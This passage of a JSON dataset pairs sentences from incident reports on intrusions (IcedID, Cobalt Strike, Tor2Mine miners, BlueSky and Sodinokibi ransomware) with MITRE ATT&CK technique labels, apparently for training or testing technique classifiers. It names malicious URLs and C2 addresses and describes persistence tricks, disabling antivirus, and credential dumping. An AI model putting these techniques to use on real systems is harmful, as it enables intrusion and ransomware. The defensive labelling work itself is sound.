    "text": "It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Additional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After discovery was completed, credentials were dumped from lsass.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Booting into Safe Mode with Networking blocked the startup of security tools and other management agents.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Our Threat Feed service picked up one of the two Cobalt Strike servers one day before this intrusion occurred and the other IP was added to the feed as soon as we recognized it.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Initial execution of the document writes a file to: C:\\Users\\Public\\microsoft.security",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The Excel file called wmic to execute the file with regsrv32",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "This then made a network request to download a file from this URL: http://vpu03jivmm03qncgx.com/index.gif",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "IcedID setup persistence on the beach head host using a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The execution of the ransomware executable created a RunOnce key for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Process injection was used multiple times across the environment using Cobalt Strike Beacons.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Initial discovery by the IcedID malware occurred within minutes of execution:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Once on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "AdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike Beacon executables were transferred using SMB and executed via a remote service.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On other systems, PowerShell was used with the same remote service execution.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "To facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "They then leveraged Cobalt Strike and Tor2Mine to perform post-exploitation activities.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The command contained base64 encoded content, which, upon execution, established a connection to a Cobalt Strike command and control server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This activity was immediately followed by injection into the legitimate process winlogon.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected process then spawned PowerShell and cmd to perform SMB scans and discovery using SMBexec.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell session was then seen making a connection to a Tor2Mine stager server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This was followed by execution of a PowerShell script which performed a variety of operations, such as checking privileges of the active user, disabling of AV solutions, and dropping of a miner payload named java.exe.",
    "command": "",
    "labels": [
      "T1083",
      "T1105",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Depending upon the privileges of the user, the script also performs creation of scheduled tasks and Windows services to maintain persistence on the host.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Around 15 minutes after initial access, the threat actors then moved laterally toward domain controllers and file shares using remote service creation.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "These services were used to execute the same PowerShell commands, download and execute the Tor2Mine malware.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After roughly 30 minutes after initial access, the BlueSky ransomware binary was dropped and executed on the beachhead.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike server observed in this intrusion was first observed on December 16th 2022 and remained active through January 17th 2023.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "SQL Server event ID 18456 Failure Audit Events in the Windows application logs:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then executed a Cobalt Strike beacon and a PowerShell script that has previously been identified by Sophos as used in campaigns to deploy Tor2Mine malware.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first PowerShell script executed a command to download a Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A connection was then established with the following Tor2Mine server and URIs.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The script first sets a variable named $priv and $osver to check whether the active user is an administrator and the operating system version respectively, in the first few lines.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It then attempts to pull down an additional script named kallen.ps1, a PowerShell version of mimikatz from the Tor2Mine server.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It also consists of a function named “StopAV”, where it tries to disable antivirus solutions – in this case, MalwareBytes, Sophos and Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "If the user is a privileged user, it first checks for the OS architecture, then downloads appropriate version (in our case, x64) of the miner and installs it as java.exe, in the “C:\\ProgramData\\Oracle\\Java” directory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It also installs a driver named WinRing0x64.sys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The function also creates multiple scheduled tasks and services which have references to Tor2Mine miner java.exe, encoded PowerShell commands and .hta files hosted on Tor2Mine servers.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "In the case of the non-privileged function “PrivFalse()”, it executes a batch script “PrivFalse.bat” as scheduled tasks and also sets up schtasks as seen in the “PrivTrue()” function.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "In the last section, a script named del.ps1 is downloaded and executed on the host as a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The del.ps1 script has been explored further in the Defense Evasion section.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "To establish persistence in the network, multiple scheduled tasks and Windows services were created on the beachhead and one of the domain controllers.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "They reference the files dropped on the compromised hosts and Tor2Mine servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was seen injecting code into legitimate process winlogon.exe via CreateRemoteThread which can be detected using Sysmon event ID 8.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion the threat actor deployed XMrig miner which loaded the driver WinRing0.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This driver is deployed to assist the miner in operations and has been in use since at least version 5.3.0.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The Windows Defender AV Real-Time Monitoring was disabled on the beachhead and one of the domain controllers using Set-MpPreference cmdlet.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell script, checking.ps1, is explained in the Execution section which contained other ways to disable AV, including registry modifications and service disabling.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "A PowerShell script named del.ps1 attempts to terminate system utilities such as Process Explorer, Task Manager, Process Monitor, and Daphne Task Manager.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In the script checking.ps1 the threat actor created 16 different tasks on the hosts where Tor2Mine was deployed.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\MUI\\LPupdate",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\RamDiagnostic\\Error Diagnostic",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\.NET Framework\\.NET Framework Cache Optimization Files-S-3-5-21-2236678156-433529325-2142214268-1138",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\.NET Framework\\.NET Framework Cache Optimization Files-S-3-5-21-2236678155-433529325-2142214968-1138",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\.NET Framework\\.NET Framework Cache Optimization",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\Registry\\RegBackup",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\DiskCleanup\\SlientDefragDisks",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN v4.0.50319 Critical",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\EDP\\EDP App Update Cache",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\EDP\\EDP App Lock Task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\UPnP\\UPnPClient Task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\UPnP\\UPnPHost",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\Shell\\WinShell",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\Shell\\WindowsShellUpdate",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\\Microsoft\\Windows\\Bluetooth\\UpdateDeviceTask",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Tor2Mine was used to access the LSASS memory space and the access granted was 0x1010.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "On the beachhead, we observed the execution of credential dumping utility Invoke-PowerDump.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed running whoami from the Tor2Mine PowerShell process on the beachhead.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors moved laterally toward the domain controllers and file shares using Remote Service creation.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Decoding the command we can see the same PowerShell download and execute as observed on the beachhead.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The hexadecimal value 0x53611451 corresponds to the IP address 83.97.20[.]81 which was the command and control server for the Tor2Mine malware.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The BlueSky ransomware binary named vmware.exe was dropped on the beachhead, which upon execution, resulted in network wide ransomware.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The whole intrusion after initial access lasted only around 30 minutes with limited discovery and no exfiltration observed.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A threat actor logged into the honeypot via RDP and installed XMRig with multiple persistence mechanisms.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Initial entry was completed by two different IP addresses via RDP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "nssm monitors the running service and will restart it if it dies.",
    "command": "",
    "labels": [
      "T1543.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "We think NSSM is used to manage the sqlserver.exe process which includes the miner.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The install script does as is named and is used to deploy the actors payload.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This is the Monero coin miner binary known as XMRig.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "You can see from the below strings that this is most likely XMRig version 5.1.0.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "sqlsupdater.sfx.exe contained the two files above and appears to include Neshta which is usually used for persistence.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Neshta installs itself into the registry for persistence using the following:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "update.bat is used to run an update (go figure).",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It deletes scheduled tasks if they exist, deletes old binaries, creates directories, sets permissions on the new files and then starts sqlsupdater.exe",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The next sequence creates multiple scheduled tasks and then cleans up after itself.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "We also found it interesting that there were multiple persistent mechanisms from Neshta to NSSM to scheduled tasks and services.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "If you get stuck in a position where you can’t see or access files, the easiest thing to do is to become system by using psexec or something similar.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This allows you to access all files, folders, scheduled tasks, etc.",
    "command": "",
    "labels": [
      "T1033",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion from December 2021, the threat actors utilized IcedID as the initial access vector.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution of the IcedID DLL, discovery activity was performed which was followed by the dropping of a Cobalt Strike beacon on the infected host.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Along the way, the threat actors installed remote management tools such as Atera and Splashtop for persisting in the environment.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution of the IcedID DLL, a connection to a C2 server was established.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This was followed by the creation of a scheduled task on the beachhead host to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The task executed the IcedID payload every one 1 hour.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The IcedID malware then used Windows utilities such as net, chcp, nltest, and wmic, to perform discovery activity on the host.",
    "command": "",
    "labels": [
      "T1012",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After a gap of almost an hour, a Cobalt Strike beacon was dropped and executed on the beachhead host.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Process injection into explorer.exe was then observed from the Cobalt Strike Beacon.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors proceeded to install remote management tools such as Atera Agent and Splashtop.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Use of these 3rd party administrative tools allow the threat actors another “legitimate” means of persistence and access if they were to lose their malware connection.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Soon after, one of the injected Cobalt Strike processes accessed LSASS memory to dump credentials from the beachhead.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "On the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "On that day, a new Cobalt Strike server was observed, in fact over the course of the intrusion, four different Cobalt Strike servers were used.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "From the beachhead host, a DLL was transferred to a domain controller over SMB and then a remote service was created on the domain controller to execute the Cobalt Strike DLL.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "After getting a foothold on the domain controller, we saw more process injection followed by the same pattern of installing Atera for additional persistent access.",
    "command": "",
    "labels": [
      "T1055",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "From the domain controller, the threat actors proceeded with more discovery tasks including AdFind and Invoke-ShareFinder again.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "On day nine of the intrusion, the next Cobalt Strike server, which would ultimately be used until the end of the intrusion, was observed for the first time.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "They reviewed the directory structure of several hosts including domain controllers and backup servers.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "They then dropped their final ransomware payload on the beachhead host and attempted to execute it using a batch file named backup.bat.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "They left for a few hours, and then returned, and attempted to exploit a couple of CVE’s in an attempt to escalate privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "While these exploits appear to have failed the threat actors found their previously captured domain admin credentials and launched two new Cobalt Strike beacons on the domain controllers.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The IcedID DLL, which gave the threat actors a foothold into the environment, was likely delivered by a “Stolen Image Evidence” email campaign.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The zip archive contains an ISO file, which once clicked and mounted, shows a document-like LNK file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once the victim opens that LNK file, the IcedID DLL loader executes, downloads, and runs the second stage of IcedID.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Scheduled Tasks Only one scheduled task was created during this intrusion.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The scheduled task was created on the beachhead host upon the execution of IcedID DLL, which executed every hour:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The injected process dllhost.exe requesting SAMTHEADMIN-92 and SAMTHEADMIN-20 accounts:  We believe the operator used the publicly available script ‘sam_the_admin‘ or a variant based on it. Part of the script generates a new computer name account in the form SAMTHEADMIN- followed by a random value between 0 to 100, as indicated below.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Disable Defender A base64 encoded PowerShell command was executed on the beachhead which disabled Windows Defender AV (T1562.001).",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Process Injection A number of process injections were seen during this intrusion.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacon used the CreateRemoteThread Win32 function in order to inject code into running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Remote threads were created in Winlogon and Explorer processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "LSASS Access The threat actors accessed LSASS process memory (T1003.001) on different hosts, including domain controllers, using multiple techniques.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The table below maps the “DesiredAccess” values with the actual corresponding access rights, and examples of credentials dumping tools requesting those accesses:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Multiple discovery techniques were observed throughout the case.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Other familiar discovery techniques were then leveraged to establish situational awareness, such as network configurations and Windows domain configuration.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Discovery was achieved using a combination of living off the land techniques (WMIC and CMD) and via third-party tools.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "‘adf.bat’ is a common batch file that we have observed in previous cases, we saw this script in 2020 as part of a Ryuk intrusion.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The PowerView module Invoke-ShareFinder was executed from the beachhead host and a domain controller.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Filesystem discovery (T1083) was conducted to collect directory lists to a text file.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Splashtop Streamer usage leaves many network connections to *.api.splashtop.com and *.relay.splashtop.com on port 443:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "There appeared to be no jitter configured, resulting in a constant stream of HTTP requests, and if using ET rules, constant alerts would be generated.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Just based on the ET Cobalt Strike rule, ‘ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response’, there were in excess of 6K alerts generated.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Due to the length of this intrusion, we observerd the threat actors handing off between C2 servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "From the beachhead host, the directory listings of the domain controllers were checked again, followed by the backup server.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After a failed attempt with CVE-2021-42278 and CVE-2021-42287, the threat actors executed Cobalt Strike beacons on a couple of domain controllers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors deployed ransomware payload in a DLL, named x64.dll, which was executed using backup.bat batch script.",
    "command": "",
    "labels": [
      "T1055",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor abused LOLbins like ie4uinit.exe and msxsl.exe to run the more_eggs malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike and python-based C2 Pyramid were employed by the threat actor for post-exploitation activity.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor installed Cloudflared to assist in tunneling RDP traffic.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon analysis, it was identified that a threat actor was able to infect and pivot from a user endpoint to two servers in the environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After being directed to an online resume site from the job posting notice, the victim downloaded the fake resume zip and executed the malicious .lnk file within the zip.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This started an execution flow with the threat actor using the ie4uinit.exe Microsoft executable to side-load a malicious .inf file.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "After that, the process dropped a malicious DLL which was executed using WMI.",
    "command": "",
    "labels": [
      "T1047",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This then created a scheduled task, followed by another WMI process to load malicious JScript using the msxsl.exe Microsoft binary.",
    "command": "",
    "labels": [
      "T1047",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This was the final more_eggs payload that established beacon activity to the command and control server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Some initial discovery commands were then run using Microsoft binaries like nltest, net, and whoami.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Activity mostly ceased until approximately one and a half days later when Cobalt Strike was dropped on the beachhead.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This was followed up with some initial discovery using Microsoft utilities and the creation of a new user on the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then used SharpShares and Seatbelt to further enumerate the host and the environment.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then attempted to deploy Pyramid on the beachhead, and while it was executed after much trouble, we observed little action from it or communication to its command and control server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the new account on the backup server they used RDP to connect from the beachhead.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
